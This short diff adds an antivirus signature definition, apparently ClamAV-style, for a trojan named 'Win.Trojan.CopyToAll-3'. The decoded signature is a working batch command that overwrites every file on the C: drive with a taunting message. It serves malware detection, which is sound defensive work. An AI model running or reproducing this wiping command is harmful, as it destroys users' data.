@@ -1,0 +1,6 @@
+VIRUS NAME: Win.Trojan.CopyToAll-3
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+@for /r \ %%g in (c:\*.*, *.*) do echo Hippie killed your DATA > %%g
+goto :end
